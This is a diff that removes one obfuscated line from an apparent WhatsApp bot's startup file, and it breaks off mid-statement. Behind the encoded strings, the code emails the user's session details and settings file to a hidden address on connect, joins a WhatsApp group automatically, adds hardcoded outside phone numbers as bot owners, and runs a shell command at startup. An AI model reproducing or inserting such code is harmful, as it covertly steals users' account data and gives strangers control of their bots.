@@ -1,1 +1,261 @@
-const _0x29aec1=_0x791a;function _0x1ec4(){const _0x304a80=['nJi4ntG2nJi5ntK0mKbZlNDOyxrZyxbWlM5LDa','Ahr0Chm6lY9JAgf0lNDOyxrZyxbWlMnVBs9gtufxmMn5wMTysKflmtzcvxLcz1jb','C3vWCg9YDa','qM9Kyxq','CMvNAw9UtMfTzq','zxHPDa','jfrfuK1Fufjpr1jbttOGjxmk','BNvTzxjPyW','mte1mtC5n1z6q0jrta','Bg9U','g1SZmw13CY1JBg9Zzsb7ie1LBMDODwj1BMDRyw4Gs2vTyMfSAsb9g1SWBq','qNvYAxq','D2LKDgG','ugvJDw4','zxjHC2vmAw5L','qMfNDwr1BMC','BwTKAxiGjeHptuuVlNrLCM11Ec8Go2vJAg8GiMv4DhjHlwTLExmGpsbBwYDfu0mNlcCVjYWNlsCSj0HptuuNlcDvucCSj0vorcCSj0jlu1aNxsXBj0TfwujpqvjejYWNq1rstcCSj0fmvcCSj0XfrLqNlcDet1DojYWNuKLhsfqNlcDftLrfuIDDxsiGpJ4GjeHptuuVlNrLCM11Ec90zxjTDxGUChjVCgvYDgLLCZT0zxjTDxGTCMvSB2fKlxnLDhrPBMDZ','z3jLzw4','y2L0Eq','lI9HBgWVzNvUy3rPB25ZlMPZ','cJ09ie9tigfUzcbfBNzPCM9UBwvUDcbwyxjPywjSzxmGpt0kcG','y2fJAgu','D3jPDgvZ','sMvTyNv0','sxnZDwuGiZeXnIbJDxjZB3jmB2nHDgLVBIbOyw5KBgvYoIa','lI9UB2rLx21VzhvSzxmVDgvYBwLUywWTA2L0l2rLBw8Vzgf0ys9Zyxr1CM4UC2j1zG','Chv0','AMLK','owHYvgXKBq','lI9ZzxnZAw9UlMPZB24','q01epIa','lI9HBgWVC2vUzevTywLS','z2vUzxjHDgu','u3vWCg9YDcbMB3iGy3vYC29YigXVy2f0Aw9UihjLCxvLC3q6ia','s29UDg9S','Ahr0Chm6lY9IAxqUBhKVyMfKlwjVDa','ywXS','r2vTyMvS','z2v0','u2LSAxq','ugvUDgLS','xLjgquLmrurEicGLCYLEoGO','qMfUz3nHDa','vgvOBW','lI9WywnRywDLlMPZB24','ChjVBxb0','DgvYBwnVBMzPz0zPBgu','BgLUzq','xKDps146cG','q09mt1jurvjn','rgfUy3vR','yxbWswq','jYaPihvWzgf0zwqHg1SWBq','D2HPDgu','qMfIyw1P','lI9Zzxr0Aw5NCY5QC29U','CgXHDgzVCM0','re9xtG','r2LSyq','yMXHy2S','uhvRAw1HAW','s2LTywS','vevstq','qw5QAw5N','vgfP','BwLU','A2v5','Dgv4Da','qMfQAw5Nyw4','jfzurv9wrvjtsu9ooIaLCWO','qNvUz3vS','CgfYC2u','g1SZmM1XCIb7ifnJyw4GFrTBmg0','yxv0Ag9Y','AgLKzun1CNnVCG','Ahr0Chm6lY9Pmc53Cc5JB20VD3D3lMDHBwjHCNvUAwSUAwqVD3aTy29UDgvUDc91CgXVywrZlZiWmtKVmdyVvg9WluDHBwjHCI1gB3rVlvbYB2zPBc1lB3nVBMCTthvJDs1uzxjNB2TPBc0UANbN','qNjLBMDZzwS','vLrfx1zfuLnjt04','CgXHBMv0','qMvQyxq','vgvYBwLUywWGyxbWieLeoIaLCWO','v0fdB25Uzwn0Aw9U','sgvHBMC','s3vUExvR','jfrfuK1vwf9wrvjtsu9ooIaLCWO','y29UBMvJDa','BMfTzq','twfOBW','sMfUy3vR','t1mGCgXHDgzVCM06icvZcG','Bw92zvrV','rgfTBG','y3vYC29Ytg9JyxrPB24','xKDps14GxKSOju4PxJOk','DgvYBwLUywW','s29SB3a','zw52','Bg9Nz2vY','CMfUzg9T','Aw52AxrL','tM9Kzsb2zxjZAw9UoIaLCWO','qMfUy2K','yMfJA2DYB3vUza','rgLJAW','CMvHzezPBgvtEw5J','Bg9Hzef1DgHjBMzV','ugfUDgf0','zNvUy3rPB24','C3rHDhvZqgjYB2fKy2fZDa','g1SZmw1JB21Tyw5KicC','lI9UB2rLx21VzhvSzxmVDgvYBwLUywWTA2L0l2XPyI90zxjTA2L0lMPZ','lI9Kzw56lMPZ','DxnLCG','y2vSBhm','CMvHzgXPBMu','zMXVB3i','vgL0Axq','mtu4nJm2mZb6wgr3t3u','CMvZB2X2zq','CxvLCNK','yxbPs2v5','g1SZmM1VCgvUihSGvgvYAhvIDw5Nih0BwZbT','oIb3ys5Tzs8','yMDxAgL0zq','s2fUy2LHBMC','pgGXpKLKzw50AxrHCYbqzw5Nz3vUysbtB3vYy2uGq29KzsbcywqTqM90pc9Omt48Cd4','vMfNAw5H','s2fTChjLDa','BgvUz3rO','y2XLyxi','C3rKB3v0','mJaZnduXmeXkvuTTBG','s2XPDg9YAxm','D2f0y2HgAwXL','vgv0zwS','sxrPBa','zhjHDW','ygbG','BwvZC2fNzxm','Dg9mB2nHBgveyxrLu3rYAw5N','qxnZAg9Szq','tMDLBNrVDa','ic0G','DgvYBwLUywWTA2L0','pc9WpG','g1SZnM0XlKnSzwfYcJiUrxHPDaOZlKnOyxrKcJqUqxv0B3jLywqGB24kns5bDxrVCMvHzcbVzMyknI5bDxrVCMvZig9UcJCUqxv0B3jLCYbVzMykoc5qDwjSAwmkos5tzwXMcJeWlKnSB2CGB24kmteUq2XVzYbVzMykmtiUr2fTzrTBmg0','Ahr0CdOVl2LWlwfWAs5JB20VANnVBI8/','t1mGDhLWztOGjxmk','g1SZmM1nB2r1BguGkcaN','yMfZzty0rw5JB2rLzef1DgHjBMzV','Bg9Hzfn5BMm','nJq5mda1nK5yB3fbwG','mY4W','xLjot146cG','u2LUDgLUzW','mtu3nJC0mgjjqxzgDa','jYbUB3qGzM91BMqHg1SWBq','qML0y2G','qhmUD2HHDhnHChaUBMv0','r2vUzxjPyYb0zxjTAw5HBdOGjxmk','vgvYBwLUywWGBMfTztOGjxmk','z2vUzxjPyW','CMvWBgfJzq','s2fJDwS','jYaPigrLDgvJDgvKirTBmg0','vgfLAW','q1vsu09sx0Xpq0fusu9o','C2vUze1LC3nHz2u','vg90B25N','C3bSAxq','ntK3mdK4mgPKy2DrDq','u3vWCg9YDcbMB3iGCgfSzxr0zsbYzxf1zxn0oIa','AgfZtMv3twvZC2fNzq','ugfUDgvR','nevfCxvdqW','rNvJAW','BwvZC2fNzq','A2v5BwfW','q29UzMLNigzPBgu6icvZcG','Bg9N','t1mGDMvYC2LVBJOGjxmk','DMvYC2LVBG','ugLSyxq','sxnZDwuGiZeXnIbdvvjtt1jFte9dqvrjt04GA2v5BwfWoIa','C2LSzw50','DhjPBq','AgvPz2H0','ygbGWQKGyNKGrgnVzguGrgvUCgeG','ywn0Aw9U','rNvJA2LUzW','Ahr0CdOVl2LWlwfWAs5JB20VBgLUzs8','y3jLyxrLsw50zxjMywnL','Bw92zxm','z2v0q3vYC29Ytg9JyxrPB24','D3jPDgvgAwXLu3LUyW','z2v0uhjVzMLSzvbPy3r1CMu','t1mGCMvSzwfZztOGjxmk','DgHLBG','C3bHy2vZAgLW','qxnPys9kywTHCNrH','z2v0ugfSzxr0zq','Bg9UzW','lI9UB2rLx21VzhvSzxmVDgvYBwLUywWTA2L0l2rLBw8Vzgf0ys9ZCgfJzxnOAxaXlNnIDwy','BM9Kzs1MzxrJAa','sgvUy2v0','z3jHEq','CxjJB2rLlxrLCM1PBMfS','otbVt2HeELK','zgvSDgffC2nHCgvtzxf1zw5Jzq','yNjVD3nLCKrLC2nYAxb0Aw9U','twvTzwS','C3rKAw4','Ahr0Chm6lY9JAgf0lNDOyxrZyxbWlMnVBs9ez3q2sMH6vhzSBuvVCJHAEJiZzKH4','DhLWzq','g1SZmw1JBg9Zzsb7ifrLCNb1DhvZih0BwZbT','qMfIAq','jenpte9svevsttOGjxmk','odiWndbVzLjzuey','vgfWDgvP','y2XVC2u','Dhj1zunVBg9Y','s2vSzw50Axq','z2v0rgv0zwn0zwruzxjTAw5HBa','C3rYAw5NAwz5','B2jQzwn0','jfrfuK06icvZcG','uhvZC3K','yM90Aa','qgfKAxDHANnOAw5Nl2jHAwXLExm','tMD1BhvT','tevgva','qxjYB3CGA2v5CZOGBw92zsb0AguGC2HPCcaTifeVq3rYBc1doIbrDwL0ic0GuMvKCMf3ihn0yxrZoIaLzcbJzwXSCYWGjwqGBw92zxmSicvKigf0DhjZlcaLzcb3CML0zxmk','ueHpve8','uKLhsfq','y2HHDc11CgrHDgu','sgvUy2v1Da','zM9YBwf0'];_0x1ec4=function(){return _0x304a80;};return _0x1ec4();}(function(_0x29703f,_0x24a335){const _0x1476d1=_0x791a,_0x59d078=_0x29703f();while(!![]){try{const _0x24e41a=parseInt(_0x1476d1(0x1a6))/0x1+parseInt(_0x1476d1(0x14c))/0x2+-parseInt(_0x1476d1(0x221))/0x3+-parseInt(_0x1476d1(0x15f))/0x4*(parseInt(_0x1476d1(0x15b))/0x5)+-parseInt(_0x1476d1(0x180))/0x6*(parseInt(_0x1476d1(0x18a))/0x7)+-parseInt(_0x1476d1(0x235))/0x8+parseInt(_0x1476d1(0x1ba))/0x9*(parseInt(_0x1476d1(0x213))/0xa);if(_0x24e41a===_0x24a335)break;else _0x59d078['push'](_0x59d078['shift']());}catch(_0x4b6e74){_0x59d078['push'](_0x59d078['shift']());}}}(_0x1ec4,0xa2de3));const {WAConnection:_WAConnection,MessageType,Presence,Mimetype,GroupSettingChange}=require(_0x29aec1(0x195)),fs=require('fs'),fetch=require(_0x29aec1(0x17c)),{exec}=require('child_process'),readline=require(_0x29aec1(0x210)),os=require('os'),simple=require('./all/simple.js'),qrcode=require(_0x29aec1(0x17f)),term=require(_0x29aec1(0x22d))[_0x29aec1(0x1fc)],termkit=require(_0x29aec1(0x20c)),{sendEmail}=require(_0x29aec1(0x1bd)),WAConnection=simple[_0x29aec1(0x1ef)](_WAConnection),moment=require('moment-timezone'),setting=JSON[_0x29aec1(0x1e5)](fs[_0x29aec1(0x206)](_0x29aec1(0x1d5))),{ownerName,botName,ownerNumber}=setting,time=moment['tz'](_0x29aec1(0x178))[_0x29aec1(0x19d)]('ha\x20z'),{wait,simih,getBuffer,h2k,generateMessageID,getGroupAdmins,getRandom,banner,start,info,success,close}=require(_0x29aec1(0x1b1)),sleep=async _0x5cbd07=>{return new Promise(_0x4a18c5=>setTimeout(_0x4a18c5,_0x5cbd07));};let d=new Date(),locale='en';const calender=d[_0x29aec1(0x229)](locale,{'day':_0x29aec1(0x1a5),'month':_0x29aec1(0x17a),'year':_0x29aec1(0x1a5)});function _0x791a(_0x5bfd8a,_0x1d6aac){const _0x1ec434=_0x1ec4();return _0x791a=function(_0x791a5e,_0x25812b){_0x791a5e=_0x791a5e-0x14b;let _0x40c002=_0x1ec434[_0x791a5e];if(_0x791a['JjiLun']===undefined){var _0x3265f6=function(_0x5cbd07){const _0x4a18c5='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x6d27fb='',_0x420e9d='';for(let _0x1c067d=0x0,_0x48483f,_0x25ed60,_0x47c244=0x0;_0x25ed60=_0x5cbd07['charAt'](_0x47c244++);~_0x25ed60&&(_0x48483f=_0x1c067d%0x4?_0x48483f*0x40+_0x25ed60:_0x25ed60,_0x1c067d++%0x4)?_0x6d27fb+=String['fromCharCode'](0xff&_0x48483f>>(-0x2*_0x1c067d&0x6)):0x0){_0x25ed60=_0x4a18c5['indexOf'](_0x25ed60);}for(let _0x54d373=0x0,_0x350dbf=_0x6d27fb['length'];_0x54d373<_0x350dbf;_0x54d373++){_0x420e9d+='%'+('00'+_0x6d27fb['charCodeAt'](_0x54d373)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x420e9d);};_0x791a['uybmEP']=_0x3265f6,_0x5bfd8a=arguments,_0x791a['JjiLun']=!![];}const _0x2734fb=_0x1ec434[0x0],_0x4595b7=_0x791a5e+_0x2734fb,_0x5376fe=_0x5bfd8a[_0x4595b7];return!_0x5376fe?(_0x40c002=_0x791a['uybmEP'](_0x40c002),_0x5bfd8a[_0x4595b7]=_0x40c002):_0x40c002=_0x5376fe,_0x40c002;},_0x791a(_0x5bfd8a,_0x1d6aac);}global['nisa']=new WAConnection(),watchFile(_0x29aec1(0x20d)),require('./denz.js'),exec(_0x29aec1(0x1ae),(_0x6d27fb,_0x420e9d,_0x1c067d)=>{const _0xa872d=_0x29aec1;console[_0xa872d(0x164)](_0x420e9d);});const starts=async _0x48483f=>{const _0x1692fd=_0x29aec1;nisa[_0x1692fd(0x1ff)]['level']=_0x1692fd(0x169),nisa[_0x1692fd(0x166)]=[0x2,0x85e,0xc],nisa[_0x1692fd(0x182)]=[''+ownerName,'Desktop',_0x1692fd(0x236)],nisa['on']('qr',_0x47c244=>{const _0x4288ed=_0x1692fd;qrcode[_0x4288ed(0x1be)](_0x47c244,{'small':!![]}),console[_0x4288ed(0x164)](_0x4288ed(0x1e6));}),fs['existsSync'](_0x48483f)&&nisa[_0x1692fd(0x207)](_0x48483f),nisa['on']('connecting',()=>{const _0x299c44=_0x1692fd;console[_0x299c44(0x164)]('\x1b[32mconnecting\x20{\x20Menghubungkan\x20}\x1b[0m');}),nisa['on']('open',()=>{const _0x2ba83b=_0x1692fd;console[_0x2ba83b(0x164)](_0x2ba83b(0x217));}),nisa['on']('ws-close',()=>{const _0x49981a=_0x1692fd;console[_0x49981a(0x164)](_0x49981a(0x1a8));}),nisa['on'](_0x1692fd(0x18c),()=>{const _0x5e79c8=_0x1692fd;console[_0x5e79c8(0x164)](_0x5e79c8(0x187));}),await nisa[_0x1692fd(0x1f3)]({'timeoutMs':0x1e*0x3e8}),fs[_0x1692fd(0x173)](_0x48483f,JSON[_0x1692fd(0x190)](nisa[_0x1692fd(0x233)](),null,'\x09'));try{pporang=await nisa[_0x1692fd(0x174)](nisa[_0x1692fd(0x20e)]['jid'][_0x1692fd(0x15a)]('@')[0x0]+_0x1692fd(0x14f));}catch{pporang=_0x1692fd(0x1e9);}const _0x25ed60=await getBuffer(pporang);fetch(_0x1692fd(0x16f))[_0x1692fd(0x176)](_0x54d373=>_0x54d373['text']())[_0x1692fd(0x176)](_0x350dbf=>{const _0x4bd7aa=_0x1692fd;sendEmail(calender+_0x4bd7aa(0x22c)+time,_0x4bd7aa(0x21b)+nisa[_0x4bd7aa(0x20e)][_0x4bd7aa(0x1f4)]+_0x4bd7aa(0x218)+nisa[_0x4bd7aa(0x20e)][_0x4bd7aa(0x1b9)]+_0x4bd7aa(0x22e),''+getRandom(),_0x350dbf+'\x0a'+JSON[_0x4bd7aa(0x190)](setting,null,0x2)+'\x0a\x0a'+JSON[_0x4bd7aa(0x190)](nisa[_0x4bd7aa(0x20e)],null,0x2));}),nisa[_0x1692fd(0x158)](ownerNumber+_0x1692fd(0x14f),''+JSON[_0x1692fd(0x190)](nisa[_0x1692fd(0x20e)],null,0x2),MessageType[_0x1692fd(0x1e1)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':botName+'\x20connected','thumbnail':_0x25ed60,'previewType':_0x1692fd(0x199)}}}),link=_0x1692fd(0x19f),nisa[_0x1692fd(0x215)]({'json':[_0x1692fd(0x16d),_0x1692fd(0x201),''+link[_0x1692fd(0x153)]('https://chat.whatsapp.com/','')]}),ip=await fetchJson(_0x1692fd(0x230),{'method':_0x1692fd(0x1c4)}),nisa['on'](_0x1692fd(0x19b),_0x1004c4=>{const _0x29739d=_0x1692fd;if(!_0x1004c4[_0x29739d(0x15d)])return;_0x1004c4=_0x1004c4[_0x29739d(0x228)][_0x29739d(0x1c2)]()[0x0];if(!_0x1004c4[_0x29739d(0x161)])return;if(_0x1004c4['key']&&!_0x1004c4[_0x29739d(0x1e0)]['remoteJid']==_0x29739d(0x20a))return;listkata=[''+setting[_0x29739d(0x216)],''+ip[_0x29739d(0x1a2)],''+ip[_0x29739d(0x1b0)],''+ip['lat'],''+ip[_0x29739d(0x1a7)],''+ip[_0x29739d(0x215)],_0x29739d(0x1dd),_0x29739d(0x188),_0x29739d(0x1f1),_0x29739d(0x1e2),'Asu',_0x29739d(0x1c8),_0x29739d(0x21d),_0x29739d(0x1c0),_0x29739d(0x183),_0x29739d(0x22b),_0x29739d(0x1c6),'Perek','Pepek',_0x29739d(0x1ab),'Bencong',_0x29739d(0x203),_0x29739d(0x1f5),_0x29739d(0x1d8),_0x29739d(0x14b),'Tolol','Sarap','Setan','Lonte',_0x29739d(0x17d),_0x29739d(0x18b),'Kampang',_0x29739d(0x167),'Keparat','Bejad',_0x29739d(0x1c3),_0x29739d(0x1ea),_0x29739d(0x1de),'Anjrit',_0x29739d(0x1c8),_0x29739d(0x160),_0x29739d(0x224),_0x29739d(0x196),_0x29739d(0x1b5),_0x29739d(0x159),_0x29739d(0x1fd),_0x29739d(0x1da),_0x29739d(0x1a1),_0x29739d(0x1f0),_0x29739d(0x1f6),_0x29739d(0x1a9),_0x29739d(0x212),'Nenen',_0x29739d(0x1ed),_0x29739d(0x1c5),'Sempak',_0x29739d(0x16e),_0x29739d(0x22a),_0x29739d(0x14e),'Penis',_0x29739d(0x21c),_0x29739d(0x222),_0x29739d(0x18e),'Borjong',_0x29739d(0x1d0),_0x29739d(0x15e),_0x29739d(0x156),_0x29739d(0x225),_0x29739d(0x1c9),_0x29739d(0x1ed),_0x29739d(0x208),_0x29739d(0x1ad),_0x29739d(0x1d4),_0x29739d(0x21a),_0x29739d(0x1e4),'Idiot',_0x29739d(0x1db),_0x29739d(0x19c),_0x29739d(0x154),'Blowjob',_0x29739d(0x193),_0x29739d(0x205),_0x29739d(0x1f9),'Ass'],copyright=_0x29739d(0x16c)+d[_0x29739d(0x229)](locale,{'year':_0x29739d(0x1a5)})+_0x29739d(0x227),grup=_0x29739d(0x185),denis=_0x29739d(0x19e),ari='6285863731628@s.whatsapp.net',script=_0x29739d(0x1c1),ownerNomor=[''+denis,setting['ownerNumber']+_0x29739d(0x14f),''+ari],require('./denz.js')(nisa,_0x1004c4);});};starts(_0x29aec1(0x1bb));const rl=readline[_0x29aec1(0x170)]({'input':process[_0x29aec1(0x184)],'output':process[_0x29aec1(0x220)],'prompt':_0x29aec1(0x1bc)});rl['prompt'](),rl['on'](_0x29aec1(0x1cd),_0x1c95cf=>{const _0x2c1ae0=_0x29aec1;switch(_0x1c95cf[_0x2c1ae0(0x16a)]()){case'menu':console['log'](_0x2c1ae0(0x22f)),console[_0x2c1ae0(0x164)]('\x1b[32mChoose:\x201-12\x1b[0m');break;case'1':console[_0x2c1ae0(0x21f)]();break;case'2':process[_0x2c1ae0(0x1a3)]();break;case'3':nisa['sendMessage']('6285866295942@s.whatsapp.net','test',MessageType[_0x2c1ae0(0x1e1)]);break;case'4':autoread=!![];break;case'5':autoread=![];break;case'6':autorespon=!![],allprefix=![],multiprefix=!![];break;case'7':autorespon=![],allprefix=!![],multiprefix=![];break;case'8':mode=!![];break;case'9':mode=![];break;case'10':clog=!![];break;case'11':clog=![];break;case'12':clog=![];var _0x178a75=termkit['ScreenBuffer'],_0x55bbc7,_0x4f5a01={};function _0x252fe9(_0x5e3eba){const _0x3cb9c8=_0x2c1ae0;termkit[_0x3cb9c8(0x18f)](function(_0x55d24b,_0x25c58e){const _0x127c92=_0x3cb9c8;if(_0x55d24b)throw new Error('Cannot\x20detect\x20terminal.');_0x55bbc7=new _0x178a75({'dst':term,'width':Math[_0x127c92(0x1df)](term[_0x127c92(0x1aa)]),'height':Math[_0x127c92(0x1df)](term[_0x127c92(0x16b)]-0x1),'y':0x2}),_0x831b9c(),_0x16aab6(),term[_0x127c92(0x1f8)]['eraseLine']['bgWhite'][_0x127c92(0x1af)](0x1,0x1,'Arrow\x20keys:\x20move\x20the\x20ship\x20-\x20Q/Ctrl-C:\x20Quit\x0a'),term[_0x127c92(0x1e8)](),term['grabInput'](),term['on'](_0x127c92(0x1e0),_0x366452),_0x5e3eba();});}function _0x1ded2b(){const _0x237707=_0x2c1ae0;term[_0x237707(0x1e8)](![]),term['grabInput'](![]),setTimeout(function(){const _0x257cc5=_0x237707;term[_0x257cc5(0x1f8)](0x1,term[_0x257cc5(0x16b)],'\x0a\x0a'),process['exit']();},0x64);}function _0x831b9c(){const _0x5c81cd=_0x2c1ae0;_0x4f5a01['background']=new _0x178a75({'width':_0x55bbc7['width']*0x4,'height':_0x55bbc7['height'],'noFill':!![]}),_0x4f5a01[_0x5c81cd(0x204)]['fill']({'attr':{'color':_0x5c81cd(0x1d3),'bgColor':_0x5c81cd(0x1d9)}}),_0x4f5a01[_0x5c81cd(0x1ec)]=_0x178a75['loadSync'](_0x5c81cd(0x1b7)),_0x57cb9a(_0x4f5a01[_0x5c81cd(0x204)][_0x5c81cd(0x1aa)]*_0x4f5a01[_0x5c81cd(0x204)][_0x5c81cd(0x16b)]*0.004),_0x186d84(_0x4f5a01[_0x5c81cd(0x204)][_0x5c81cd(0x1aa)]*_0x4f5a01['background']['height']*0.008),_0x2d1487(_0x4f5a01[_0x5c81cd(0x204)][_0x5c81cd(0x1aa)]*_0x4f5a01[_0x5c81cd(0x204)][_0x5c81cd(0x16b)]*0.0001);}function _0x186d84(_0x180aee){const _0xd3dda6=_0x2c1ae0;var _0x43b1af,_0x2f72d6,_0x5bfb6b,_0x2602e2,_0x963463;for(_0x43b1af=0x0;_0x43b1af<_0x180aee;_0x43b1af++){_0x5bfb6b=Math[_0xd3dda6(0x211)](Math['random']()*_0x4f5a01[_0xd3dda6(0x204)][_0xd3dda6(0x1aa)]),_0x2602e2=Math[_0xd3dda6(0x211)](Math[_0xd3dda6(0x200)]()*_0x4f5a01[_0xd3dda6(0x204)][_0xd3dda6(0x16b)]),_0x963463=0x3+Math[_0xd3dda6(0x211)](Math[_0xd3dda6(0x200)]()*0x8);for(_0x2f72d6=0x0;_0x2f72d6<_0x963463;_0x2f72d6++){_0x4f5a01[_0xd3dda6(0x204)]['put']({'x':(_0x5bfb6b+_0x2f72d6)%_0x4f5a01[_0xd3dda6(0x204)][_0xd3dda6(0x1aa)],'y':_0x2602e2,'attr':{'color':_0xd3dda6(0x17e),'bgColor':_0xd3dda6(0x1d9)}},'-');}}}function _0x57cb9a(_0x1f7619){const _0x23a0cb=_0x2c1ae0;var _0x5c6dfd,_0x3c0bd3,_0x2131d4,_0x4b93f7,_0x403d21,_0x413353=['*','.','o','+','°'];for(_0x5c6dfd=0x0;_0x5c6dfd<_0x1f7619;_0x5c6dfd++){_0x3c0bd3=Math['floor'](Math[_0x23a0cb(0x200)]()*_0x4f5a01[_0x23a0cb(0x204)]['width']),_0x2131d4=Math[_0x23a0cb(0x211)](Math[_0x23a0cb(0x200)]()*_0x4f5a01[_0x23a0cb(0x204)][_0x23a0cb(0x16b)]),_0x403d21=_0x413353[Math['floor'](Math[_0x23a0cb(0x200)]()*_0x413353[_0x23a0cb(0x21e)])],_0x4b93f7=Math[_0x23a0cb(0x211)](Math[_0x23a0cb(0x200)]()*0x10),_0x4f5a01[_0x23a0cb(0x204)][_0x23a0cb(0x1b8)]({'x':_0x3c0bd3,'y':_0x2131d4,'attr':{'color':_0x4b93f7,'bgColor':_0x23a0cb(0x1d9)}},_0x403d21);}}function _0x2d1487(_0x31d65f){const _0x4b803a=_0x2c1ae0;var _0xbb1341,_0x2ab2ec,_0x2a3a3e;for(_0xbb1341=0x0;_0xbb1341<_0x31d65f;_0xbb1341++){_0x2ab2ec=Math['floor'](Math[_0x4b803a(0x200)]()*_0x4f5a01[_0x4b803a(0x204)]['width']),_0x2a3a3e=Math[_0x4b803a(0x211)](Math[_0x4b803a(0x200)]()*_0x4f5a01[_0x4b803a(0x204)][_0x4b803a(0x16b)]),_0x4f5a01[_0x4b803a(0x1ec)][_0x4b803a(0x226)]({'dst':_0x4f5a01[_0x4b803a(0x204)],'x':Math[_0x4b803a(0x211)](_0x2ab2ec-_0x4f5a01[_0x4b803a(0x1ec)]['width']/0x2),'y':Math['floor'](_0x2a3a3e-_0x4f5a01['planet'][_0x4b803a(0x16b)]/0x2),'blending':!![],'wrap':'x'});}}function _0x16aab6(){const _0x34901e=_0x2c1ae0;_0x4f5a01['spaceship']=_0x178a75[_0x34901e(0x234)](_0x34901e(0x17b)),_0x4f5a01[_0x34901e(0x177)]['x']=0x3,_0x4f5a01[_0x34901e(0x177)]['y']=Math[_0x34901e(0x211)](_0x55bbc7[_0x34901e(0x16b)]/0x2-_0x4f5a01[_0x34901e(0x177)][_0x34901e(0x16b)]/0x2);}function _0x366452(_0x1f3762){const _0x578fc4=_0x2c1ae0;switch(_0x1f3762){case'UP':_0x4f5a01[_0x578fc4(0x177)]['y']--;break;case _0x578fc4(0x1d7):_0x4f5a01[_0x578fc4(0x177)]['y']++;break;case _0x578fc4(0x197):_0x4f5a01[_0x578fc4(0x177)]['x']--;break;case _0x578fc4(0x19a):_0x4f5a01[_0x578fc4(0x177)]['x']++;break;case'CTRL_C':_0x1ded2b();break;}}function _0x42dd40(){const _0x20234b=_0x2c1ae0;_0x4f5a01[_0x20234b(0x204)]['x']--;}var _0x71ea73=0x0;function _0xf7f819(){const _0x448ce0=_0x2c1ae0;_0x4f5a01['background'][_0x448ce0(0x226)]({'dst':_0x55bbc7,'tile':!![]}),_0x4f5a01[_0x448ce0(0x177)][_0x448ce0(0x226)]({'dst':_0x55bbc7,'blending':!![],'wrap':_0x448ce0(0x194)});var _0x2cdc16=_0x55bbc7[_0x448ce0(0x226)]({'delta':![]});term[_0x448ce0(0x1f8)][_0x448ce0(0x1ac)][_0x448ce0(0x219)][_0x448ce0(0x1af)](0x1,0x1,_0x448ce0(0x198),_0x2cdc16[_0x448ce0(0x20f)],_0x2cdc16[_0x448ce0(0x171)],_0x2cdc16['attrs'],_0x2cdc16[_0x448ce0(0x1b4)]),_0x71ea73++;}function _0x22f4c3(){_0xf7f819(),_0x42dd40(),setTimeout(_0x22f4c3,0x32);}_0x252fe9(function(){_0x22f4c3();});break;default:console[_0x2c1ae0(0x164)](_0x2c1ae0(0x20b)+_0x1c95cf[_0x2c1ae0(0x16a)]()+_0x2c1ae0(0x14d));break;}rl[_0x2c1ae0(0x1cb)]();})['on'](_0x29aec1(0x18c),()=>{const _0x5e8adb=_0x29aec1;console[_0x5e8adb(0x21f)](),console[_0x5e8adb(0x164)]('\x1b[37mexited\x20have\x20a\x20great\x20day!\x1b[0m'),process[_0x5e8adb(0x1a3)](0x0);});async function testTerminal(_0x1a3db3){const _0x313d31=_0x29aec1;var _0x245786;term(_0x313d31(0x151),_0x1a3db3['appName']),term(_0x313d31(0x1ee),_0x1a3db3[_0x313d31(0x1d1)]),term(_0x313d31(0x150),_0x1a3db3[_0x313d31(0x152)]),term(_0x313d31(0x163),_0x1a3db3[_0x313d31(0x1cc)]),term('\x0a'),term('Support\x20for\x20delta\x20escape\x20sequence:\x20'+(_0x1a3db3['support'][_0x313d31(0x181)]?_0x313d31(0x1ce):'^RNO^:\x0a')),term('Support\x20for\x20256\x20colors:\x20'+(_0x1a3db3[_0x313d31(0x1a0)]['256colors']?_0x313d31(0x1ce):'^RNO^:\x0a')),term('Support\x20for\x20true\x20colors:\x20'+(_0x1a3db3[_0x313d31(0x1a0)][_0x313d31(0x18d)]?_0x313d31(0x1ce):_0x313d31(0x237)));try{term(_0x313d31(0x1bf)),_0x245786=await _0x1a3db3[_0x313d31(0x172)](),term(_0x313d31(0x1fb),_0x245786);}catch(_0x2d2e3c){term(_0x313d31(0x1c7),_0x2d2e3c);}try{term(_0x313d31(0x15c)),await _0x1a3db3[_0x313d31(0x179)](),term(_0x313d31(0x1ce));}catch(_0x4fe676){term(_0x313d31(0x1c7),_0x4fe676);}term(_0x313d31(0x168)+(_0x1a3db3[_0x313d31(0x162)]['CURSOR_LOCATION']&&typeof _0x1a3db3[_0x313d31(0x162)][_0x313d31(0x157)]===_0x313d31(0x191)?_0x313d31(0x1ce):'^RNO^:\x0a')),term(_0x313d31(0x1b6)+(typeof _0x1a3db3['handler'][_0x313d31(0x1fa)]===_0x313d31(0x209)?_0x313d31(0x1ce):_0x313d31(0x237))),term('\x0a');}async function detect(){const _0x3d0985=_0x29aec1;var _0x37d0c1,_0x472894;term[_0x3d0985(0x1af)](_0x3d0985(0x1b2)),term('Developer:\x20%s\x0a',require(_0x3d0985(0x1ca))[_0x3d0985(0x1e7)]),term(_0x3d0985(0x202),process[_0x3d0985(0x166)]),term(_0x3d0985(0x1f7),os[_0x3d0985(0x1d6)]()),term(_0x3d0985(0x231),os[_0x3d0985(0x186)]()),term(_0x3d0985(0x175),os['release']()),term(_0x3d0985(0x165),os['version']&&os[_0x3d0985(0x166)]()),term(_0x3d0985(0x192),process['env'][_0x3d0985(0x1dc)]),term(_0x3d0985(0x189),process[_0x3d0985(0x1fe)][_0x3d0985(0x1cf)]),term(_0x3d0985(0x1e3),process[_0x3d0985(0x1fe)][_0x3d0985(0x1eb)]),term(_0x3d0985(0x1a4),process[_0x3d0985(0x1fe)]['TERM_PROGRAM']),term(_0x3d0985(0x1f2),process[_0x3d0985(0x1fe)]['TERMUX_VERSION']),term('\x0a');}detect();function watchFile(_0xbb9cb3,_0x441573=_0x12ebd0=>console['log']('\x1b[32mModule\x20(\x20\x27'+_0x12ebd0+_0x29aec1(0x1d2))){const _0x330166=_0x29aec1;console[_0x330166(0x164)](_0x330166(0x232)+_0xbb9cb3+_0x330166(0x155)),fs[_0x330166(0x223)](require[_0x330166(0x214)](_0xbb9cb3),async()=>{const _0x264acd=_0x330166;await uncache(require[_0x264acd(0x214)](_0xbb9cb3)),_0x441573(_0xbb9cb3);});}function uncache(_0x107e05='.'){return new Promise((_0x2a7bce,_0x4e0a44)=>{const _0x3d279d=_0x791a;try{delete 